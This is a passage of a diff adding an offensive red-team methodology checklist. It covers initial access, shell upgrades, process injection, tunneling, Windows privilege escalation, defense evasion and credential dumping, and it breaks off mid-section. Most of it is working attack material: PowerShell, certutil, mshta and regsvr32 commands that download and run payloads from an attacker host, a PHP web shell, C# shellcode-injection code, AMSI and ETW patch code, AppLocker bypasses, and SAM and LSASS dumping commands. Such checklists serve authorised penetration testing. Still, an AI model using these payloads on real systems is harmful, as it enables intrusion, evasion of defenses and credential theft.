+$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://[ip]/loader.ps1")'
+$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell -nop -w hidden -enc $b64</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-1-0"> Patch AMSI early: <code>[Ref].Assembly.GetType(...)</code> pattern (publicly known)</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-1-1"> Patch ETW: <code>EtwEventWrite</code> patch via reflection</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-1-2"> Compile with <code>PS2EXE</code> when an .exe is needed</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-1-3"> Test with CLM on a staging host</li>
+    <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-2"> Webshell options when web is the only entry:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-2-0"> ASPX cmd shell</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-2-1"> JSP cmd shell</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-2-2"> PHP one-liner: <code>&lt;?=`$_GET[0]`?&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-2-3"> Tiny stagers that pull the second stage in memory</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-initial-access-shell-upgrade">11.3.3 Upgrading Shells</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-0"> Upgrade reverse shell to a fully interactive PTY (Linux):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-0-0"> <code>python3 -c "import pty; pty.spawn('/bin/bash')"</code></li>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-0-1"> <code>export TERM=xterm-256color</code></li>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-0-2"> Ctrl-Z, then <code>stty raw -echo; fg</code>, Enter</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-0-3"> <code>stty rows 50 cols 200</code> to match your terminal</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-1"> Upgrade Windows shell to Meterpreter or Beacon:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-1-0"> Use the same shell to drop and execute a staged payload</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-1-1"> Or use a one-liner: <code>powershell -nop -w hidden -enc &lt;b64&gt;</code></li>
+        <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-1-2"> Confirm the new callback before closing the old shell</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Linux: full PTY upgrade sequence
+python3 -c "import pty; pty.spawn('/bin/bash')"
+# Ctrl-Z to background
+stty raw -echo; fg
+export TERM=xterm-256color
+stty rows 50 cols 200
+
+# Alternative: script-based PTY
+script -qc /bin/bash /dev/null</code></pre>
+<pre><code class="language-powershell"># Windows: upgrade basic shell to Meterpreter
+# Option 1: PowerShell download cradle
+powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://[ip]/shell.ps1')"
+
+# Option 2: certutil download + execute
+certutil -urlcache -split -f http://[ip]/payload.exe C:\Windows\Temp\svc.exe
+C:\Windows\Temp\svc.exe
+
+# Option 3: Meterpreter session upgrade (from within msfconsole)
+sessions -u [session-id]</code></pre>
+
+<h4 id="methodology-initial-access-process-injection">11.3.4 Process Injection & Migration</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-0"> Pick a target process appropriate for the payload:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-0-0"> Long-lived: <code>explorer.exe</code>, <code>svchost.exe</code></li>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-0-1"> Short-lived but useful: spawned <code>notepad.exe</code> under your token</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-0-2"> Avoid Office processes for post-ex; signature traps abound</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-1"> Choose the technique by EDR posture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-1-0"> Classic <code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>CreateRemoteThread</code> (noisy, easy)</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-1-1"> APC injection (<code>QueueUserAPC</code> + <code>NtAlertResumeThread</code>) for stealthier delivery</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-1-2"> Process hollowing for fresh-process payloads</li>
+        <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-1-3"> Module stomping when EDR alerts on RWX allocations</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-csharp">// Classic remote process injection — VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+class Injector {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr,
+        uint size, uint allocType, uint protect);
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr,
+        byte[] buf, uint size, out UIntPtr written);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attr,
+        uint stack, IntPtr start, IntPtr param, uint flags, IntPtr tid);
+
+    static void Main(string[] args) {
+        int pid = int.Parse(args[0]);
+        byte[] shellcode = Decrypt(encrypted, key);  // runtime decrypt
+
+        IntPtr hProc = OpenProcess(0x001F0FFF, false, pid); // PROCESS_ALL_ACCESS
+        IntPtr addr  = VirtualAllocEx(hProc, IntPtr.Zero,
+            (uint)shellcode.Length, 0x3000, 0x04);          // RW first
+        WriteProcessMemory(hProc, addr, shellcode,
+            (uint)shellcode.Length, out _);
+        VirtualProtectEx(hProc, addr,
+            (uint)shellcode.Length, 0x20, out _);           // flip to RX
+        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr,
+            IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}</code></pre>
+<pre><code class="language-csharp">// Process Hollowing — key API call sequence
+// 1. CreateProcess in SUSPENDED state
+CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ...,
+    CREATE_SUSPENDED, ...);
+// 2. Unmap the original image
+ZwUnmapViewOfSection(hProcess, pImageBase);
+// 3. Allocate new memory at the preferred base
+VirtualAllocEx(hProcess, pImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+// 4. Write the PE headers + sections
+WriteProcessMemory(hProcess, pImageBase, payload, payloadSize, ...);
+// 5. Set the entry point in the thread context
+SetThreadContext(hThread, &amp;ctx);
+// 6. Resume the thread
+ResumeThread(hThread);</code></pre>
+
+<h5>Process Injection Technique Matrix</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th>Key API Calls</th>
+      <th>Detection Level</th>
+      <th>Notes</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Classic Remote Thread</td>
+      <td><code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>CreateRemoteThread</code></td>
+      <td>High</td>
+      <td>Most EDRs hook CreateRemoteThread; easy to implement</td>
+    </tr>
+    <tr>
+      <td>APC Injection</td>
+      <td><code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> + <code>QueueUserAPC</code></td>
+      <td>Medium</td>
+      <td>Target thread must enter alertable state; stealthier than CRT</td>
+    </tr>
+    <tr>
+      <td>Process Hollowing</td>
+      <td><code>CreateProcess(SUSPENDED)</code> + <code>ZwUnmapViewOfSection</code> + <code>WriteProcessMemory</code></td>
+      <td>Medium</td>
+      <td>Creates clean process; image mismatch detectable by EDR</td>
+    </tr>
+    <tr>
+      <td>Module Stomping</td>
+      <td><code>LoadLibrary</code> + overwrite <code>.text</code> section</td>
+      <td>Low</td>
+      <td>Avoids RWX allocation; backed by legitimate module on disk</td>
+    </tr>
+    <tr>
+      <td>Syscall Stub (Direct)</td>
+      <td>Inline <code>NtAllocateVirtualMemory</code> / <code>NtWriteVirtualMemory</code></td>
+      <td>Low</td>
+      <td>Bypasses ntdll hooks; requires syscall number resolution</td>
+    </tr>
+    <tr>
+      <td>Early Bird</td>
+      <td><code>CreateProcess(SUSPENDED)</code> + <code>QueueUserAPC</code> + <code>ResumeThread</code></td>
+      <td>Low-Medium</td>
+      <td>APC queued before process init; runs before EDR hooks load</td>
+    </tr>
+  </tbody>
+</table>
+<p><strong>References:</strong> <a href="https://attack.mitre.org/techniques/T1055/" target="_blank" rel="noopener noreferrer">MITRE T1055 Process Inj</a></p>
+
+<h5>Initial Access Decision Table</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Delivery Method</th>
+      <th>When to Use</th>
+      <th>Key Tool / Command</th>
+      <th>AV/EDR Concern</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Office Macro (.docm)</td>
+      <td>Macros enabled, no ASR rules</td>
+      <td>VBA + encrypted shellcode runner</td>
+      <td>AMSI scans VBA at runtime</td>
+    </tr>
+    <tr>
+      <td>HTA (.hta)</td>
+      <td>No AppLocker, mshta.exe allowed</td>
+      <td><code>mshta http://[ip]/payload.hta</code></td>
+      <td>WDAV flags known HTA patterns</td>
+    </tr>
+    <tr>
+      <td>ISO/IMG Container</td>
+      <td>MotW bypass needed (email gateway)</td>
+      <td><code>PackMyPayload.py -H</code></td>
+      <td>Payload inside must still evade</td>
+    </tr>
+    <tr>
+      <td>DLL Side-Loading</td>
+      <td>Signed EXE loads missing DLL</td>
+      <td>ProcMon <code>NAME NOT FOUND</code> filter</td>
+      <td>Low detection if DLL name matches</td>
+    </tr>
+    <tr>
+      <td>C# Loader (.exe)</td>
+      <td>.NET 4.x present, direct execution OK</td>
+      <td><code>csc /target:exe /platform:x64</code></td>
+      <td>Patch AMSI before assembly load</td>
+    </tr>
+    <tr>
+      <td>PowerShell Cradle</td>
+      <td>CLM off, PowerShell not blocked</td>
+      <td><code>IEX(New-Object Net.WebClient).DownloadString(...)</code></td>
+      <td>ScriptBlock logging, AMSI</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a> &middot; <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a></p>
+
+<h3 id="methodology-tunneling">11.4 Tunneling</h3>
+<p>Pivot through the foothold into restricted subnets without breaking ops.</p>
+<h4 id="methodology-tunneling-ligolo">11.4.1 Ligolo-ng</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-ligolo-wf-0"> Set up the proxy server side:</li>
+  </ul>
+<pre><code class="language-bash"># Attacker: create TUN interface and start proxy
+sudo ip tuntap add user [you] mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-ligolo-wf-1"> Drop the agent on the foothold:</li>
+  </ul>
+<pre><code class="language-bash"># Foothold: connect agent back to proxy
+./agent -connect [ip]:11601 -ignore-cert</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-ligolo-wf-2"> Route attacker traffic into the foothold&rsquo;s subnet:</li>
+  </ul>
+<pre><code class="language-bash"># In ligolo proxy console
+session     # select the agent session
+start       # start the tunnel
+
+# Attacker: add route for the internal subnet
+sudo ip route add [subnet]/[mask] dev ligolo
+
+# Validate connectivity
+curl https://[internal-host]</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-tunneling-sshuttle">11.4.2 sshuttle</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-sshuttle-wf-0"> When the foothold is Linux with SSH key access:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tunneling-sshuttle-wf-0-0"> <code>sshuttle -r user@[foothold] [subnet]/[mask]</code></li>
+        <li><input type="checkbox" data-id="methodology-tunneling-sshuttle-wf-0-1"> Add <code>--dns</code> to forward DNS through the tunnel</li>
+        <li><input type="checkbox" data-id="methodology-tunneling-sshuttle-wf-0-2"> Add <code>-x [your-ip]</code> to exclude your management session</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-tunneling-metasploit-pivot">11.4.3 Metasploit Pivoting</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-metasploit-pivot-wf-0"> Set up a route through a Meterpreter session:</li>
+  </ul>
+<pre><code class="language-bash"># In meterpreter session
+run autoroute -s [subnet]/[mask]
+
+# Background session and start SOCKS proxy
+background
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+run -j
+
+# Use with proxychains from attacker
+proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-tunneling-domain-fronting">11.4.4 Domain Fronting</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-domain-fronting-wf-0"> Confirm a CDN that still permits SNI/Host mismatch:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tunneling-domain-fronting-wf-0-0"> Check current CDN provider docs &mdash; many have closed this</li>
+        <li><input type="checkbox" data-id="methodology-tunneling-domain-fronting-wf-0-1"> Validate with a test domain before staging C2</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-tunneling-dns-tunneling">11.4.5 DNS Tunneling</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-tunneling-dns-tunneling-wf-0"> When egress is locked to DNS only:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-tunneling-dns-tunneling-wf-0-0"> Set up an authoritative server for a controlled domain</li>
+        <li><input type="checkbox" data-id="methodology-tunneling-dns-tunneling-wf-0-1"> Use Sliver DNS C2 or Iodine for raw tunnels</li>
+        <li><input type="checkbox" data-id="methodology-tunneling-dns-tunneling-wf-0-2"> Validate latency &mdash; DNS C2 is slow; plan operations accordingly</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding" target="_blank" rel="noopener noreferrer">HackTricks Tunneling</a> &middot; <a href="https://attack.mitre.org/techniques/T1090/" target="_blank" rel="noopener noreferrer">MITRE T1090 Proxy</a></p>
+
+<h3 id="methodology-windows-postex">11.5 Windows Post Exploitation</h3>
+<p>Situational awareness &rarr; escalate &rarr; evade &rarr; loot. Cycle until the host yields what the engagement needs.</p>
+<h4 id="methodology-windows-postex-sit-aware">11.5.1 Situational Awareness</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-0"> Identity and integrity:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-0-0"> <code>whoami /all</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-0-1"> <code>net user [me] /domain</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-0-2"> Token groups, privileges, integrity level</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-1"> Host posture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-1-0"> <code>systeminfo</code> for OS build, hotfixes, domain</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-1-1"> <code>Get-CimInstance Win32_Product</code> for installed software</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-1-2"> <code>Get-Service | ?{$_.Status -eq "Running"}</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-2"> Network posture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-2-0"> <code>ipconfig /all</code> + <code>route print</code> + <code>arp -a</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-2-1"> <code>netstat -ano</code> for listeners and active sessions</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-2-2"> <code>Get-DnsClientServerAddress</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-3"> Defence posture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-3-0"> <code>Get-MpComputerStatus</code> for Defender state</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-3-1"> <code>Get-MpPreference | select Exclusion*</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-3-2"> Identify EDR drivers: <code>fltmc</code>, <code>driverquery /v</code></li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></p>
+
+<h4 id="methodology-windows-postex-privesc">11.5.2 Privilege Escalation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-0"> Triage with an automated check first:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-0-0"> WinPEAS: <code>winpeas.exe quiet</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-0-1"> PrivescCheck: <code>Invoke-PrivescCheck -Extended</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-0-2"> Seatbelt: <code>Seatbelt.exe -group=all</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-1"> Look at the quick wins:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-1-0"> AlwaysInstallElevated registry keys</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-1-1"> Unquoted service paths with writable directories</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-1-2"> Modifiable service binaries / configs</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-1-3"> Writable autoruns or scheduled tasks</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-1-4"> DLL hijack opportunities in the PATH</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-2"> Token primitives if SeImpersonate is held:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-2-0"> PrintSpoofer (Print Service)</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-2-1"> RoguePotato / GodPotato (DCOM)</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-2-2"> EfsPotato / SeManageVolumePrivilege variants</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-3"> Software vuln route when configs are clean:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-3-0"> Cross-check installed software against MSRC and Exploit-DB</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-3-1"> Try kernel-mode CVE only when nothing else lands</li>
+      </ul>
+    </li>
+  </ul>
+<h5>Windows Privesc Quick Reference</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th>Check Command</th>
+      <th>Exploit Condition</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>SeImpersonate</td>
+      <td><code>whoami /priv</code></td>
+      <td>Token has SeImpersonatePrivilege &rarr; Potato family</td>
+    </tr>
+    <tr>
+      <td>AlwaysInstallElevated</td>
+      <td><code>reg query HKLM\...\Installer /v AlwaysInstallElevated</code></td>
+      <td>Both HKLM and HKCU keys set to 1 &rarr; <code>msfvenom -f msi</code></td>
+    </tr>
+    <tr>
+      <td>Unquoted Service Path</td>
+      <td><code>wmic service get name,pathname | findstr /v "C:\Windows"</code></td>
+      <td>Path has spaces + no quotes + writable parent dir</td>
+    </tr>
+    <tr>
+      <td>Modifiable Service Binary</td>
+      <td><code>icacls [service-binary-path]</code></td>
+      <td>Current user has write access &rarr; replace binary</td>
+    </tr>
+    <tr>
+      <td>DLL Hijack (PATH)</td>
+      <td><code>echo %PATH%</code> + <code>icacls</code> each dir</td>
+      <td>Writable PATH dir before the real DLL location</td>
+    </tr>
+    <tr>
+      <td>Scheduled Task</td>
+      <td><code>schtasks /query /fo LIST /v</code></td>
+      <td>Task runs as SYSTEM + writable script/binary path</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>References:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://attack.mitre.org/techniques/T1068/" target="_blank" rel="noopener noreferrer">MITRE T1068 PrivEsc Vuln</a></p>
+
+<h4 id="methodology-windows-postex-defense-evasion">11.5.3 Defense Evasion</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-0"> AMSI before any in-process .NET / PowerShell load:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-0-0"> Reflection-based AmsiScanBuffer patch (publicly known pattern)</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-0-1"> Hardware breakpoint method for hardened hosts</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-1"> ETW before any high-volume telemetry-emitting code:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-1-0"> Patch <code>EtwEventWrite</code> in <code>ntdll</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-1-1"> Or use <code>NtTraceEvent</code> patch for kernel-mode-bound paths</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-2"> PowerShell CLM bypass when CLM is enforced:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-2-0"> PowerShell v2 downgrade when v2 is present</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-2-1"> Trusted-publisher bypass via signed loader</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-3"> Defender exclusions when an exclusion path is writable:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-3-0"> Read <code>HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions</code></li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-3-1"> Drop staged payloads into excluded directories</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-powershell"># AMSI Bypass — reflection-based AmsiScanBuffer patch
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f=$a.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null,$true)
+
+# Alternative: force-fail AmsiScanBuffer via memory patch
+$w = [System.Runtime.InteropServices.Marshal]
+$p = [Win32]::GetProcAddress([Win32]::GetModuleHandle("amsi.dll"), "AmsiScanBuffer")
+[Win32]::VirtualProtect($p, [uint32]5, 0x40, [ref]0)
+$patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+$w::Copy($patch, 0, $p, 6)</code></pre>
+<pre><code class="language-powershell"># ETW Patch — disable Event Tracing for Windows
+$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+$f=$a.GetField('etwProvider','NonPublic,Static')
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled',
+    'NonPublic,Instance').SetValue($f.GetValue($null),0)
+
+# Alternative: patch EtwEventWrite in ntdll directly
+$ntdll = [Win32]::GetModuleHandle("ntdll.dll")
+$etwAddr = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
+[Win32]::VirtualProtect($etwAddr, [uint32]1, 0x40, [ref]0)
+[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)  # ret</code></pre>
+<pre><code class="language-bash"># AppLocker Bypass — execute via trusted Microsoft binaries (LOLBAS)
+
+# MSBuild: compile inline C# task from XML
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+
+# InstallUtil: /U flag runs Uninstall() without admin
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
+
+# WMIC: XSL script execution
+wmic os get /format:"http://[ip]/payload.xsl"
+
+# Regsvr32: scriptlet execution (squiblydoo)
+regsvr32 /s /n /u /i:http://[ip]/payload.sct scrobj.dll
+
+# MSHTA: execute HTA inline or remote
+mshta http://[ip]/payload.hta
+
+# PowerShell CLM Bypass — downgrade to v2
+powershell -version 2 -c "IEX(...)"</code></pre>
+
+<h5>AppLocker Bypass Quick-Reference</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Binary</th>
+      <th>Default Location</th>
+      <th>Bypass Command</th>
+      <th>Payload Format</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MSBuild.exe</td>
+      <td><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code></td>
+      <td><code>MSBuild.exe payload.xml</code></td>
+      <td>XML with inline C# task</td>
+    </tr>
+    <tr>
+      <td>InstallUtil.exe</td>
+      <td><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code></td>
+      <td><code>InstallUtil.exe /U payload.dll</code></td>
+      <td>.NET DLL with Uninstall()</td>
+    </tr>
+    <tr>
+      <td>WMIC.exe</td>
+      <td><code>C:\Windows\System32\wbem\</code></td>
+      <td><code>wmic os get /format:"payload.xsl"</code></td>
+      <td>XSL with embedded JScript</td>
+    </tr>
+    <tr>
+      <td>Regsvr32.exe</td>
+      <td><code>C:\Windows\System32\</code></td>
+      <td><code>regsvr32 /s /n /u /i:payload.sct scrobj.dll</code></td>
+      <td>SCT scriptlet (COM)</td>
+    </tr>
+    <tr>
+      <td>MSHTA.exe</td>
+      <td><code>C:\Windows\System32\</code></td>
+      <td><code>mshta http://[ip]/payload.hta</code></td>
+      <td>HTA with VBScript/JScript</td>
+    </tr>
+    <tr>
+      <td>CertReq.exe</td>
+      <td><code>C:\Windows\System32\</code></td>
+      <td><code>certreq -Post -config http://[ip] file.txt</code></td>
+      <td>Exfiltration via POST</td>
+    </tr>
+  </tbody>
+</table>
+<p><strong>References:</strong> <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener noreferrer">MITRE T1027 Obfuscation</a></p>
+
+<h4 id="methodology-windows-postex-credential-access">11.5.4 Credential Access</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-0"> LSASS dump &mdash; only when authorised, prefer reflective approaches:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-0-0"> Comsvcs.dll MiniDump LoLBin</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-0-1"> NanoDump / pypykatz / dumpert</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-0-2"> Process the dump offline with <code>pypykatz</code> or <code>mimikatz</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-1"> SAM &amp; SYSTEM offline:</li>
+  </ul>
+<pre><code class="language-bash"># On target (requires admin)
+reg save HKLM\SAM C:\Windows\Temp\sam.save
+reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+reg save HKLM\SECURITY C:\Windows\Temp\security.save
+
+# Download and process offline
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-2"> NTDS from a domain controller:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-2-0"> <code>ntdsutil.exe</code> snapshot path</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-2-1"> <code>vssadmin</code> shadow copy + extract</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-2-2"> Process with <code>secretsdump.py -ntds ntds.dit -system system.hive LOCAL</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-3"> User-context credential stores:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-3-0"> Browser cookie / login stores via DPAPI</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-3-1"> Windows Credential Manager via <code>cmdkey</code> / DPAPI</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-3-2"> Putty / OpenSSH keys in user profile</li>
+        <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-3-3"> KeePass / Lastpass agents if present</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># LSASS Dump via comsvcs.dll (LoLBin — no tools needed)
+# Find lsass PID first
+tasklist /fi "imagename eq lsass.exe"
